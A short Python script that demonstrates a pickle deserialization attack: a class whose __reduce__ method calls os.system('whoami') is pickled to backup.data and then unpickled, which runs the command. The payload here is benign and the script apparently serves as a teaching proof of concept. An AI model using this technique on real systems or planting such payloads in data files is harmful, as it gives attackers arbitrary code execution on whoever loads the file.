import pickle
import os

#1. creating a  class which has our malicious payload command (‘whoami’)
class MyEvilPickle(object):
	def __reduce__(self):
		return (os.system, ('whoami', ))

#2. serializing the malicious class
pickle_data = pickle.dumps(MyEvilPickle())
#storing the serialized output into a file in current directory
with open("backup.data", "wb") as file:
	file.write(pickle_data)

#reading the malicious serialized data and de-serializing it
with open("backup.data", "rb") as file:
    pickle_data = file.read()
    my_data = pickle.loads(pickle_data)